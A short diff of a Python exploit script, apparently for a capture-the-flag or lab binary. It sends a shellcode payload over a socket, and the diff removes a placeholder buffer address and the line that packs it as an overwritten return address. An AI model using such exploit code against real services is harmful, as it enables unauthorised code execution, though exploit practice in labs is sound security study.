@@ -25,16 +25,10 @@ def exploit():
     prompt = s.recv(1024)
     print(f"Prompt: {prompt}")
     
-    # Calculate buffer address (you may need to adjust this)
-    # The buffer is at a fixed location in the binary's data section
-    # We can find this with gdb or by testing
-    buffer_addr = 0x804c000  # This is an example - you'll need the actual address
     
     # Build the payload
     payload = shellcode
     
-    # Overwrite return address - jump to our shellcode in the global buffer
-    payload += struct.pack("<I", buffer_addr)
     
     # Send the payload
     print(f"Sending {len(payload)} bytes...")
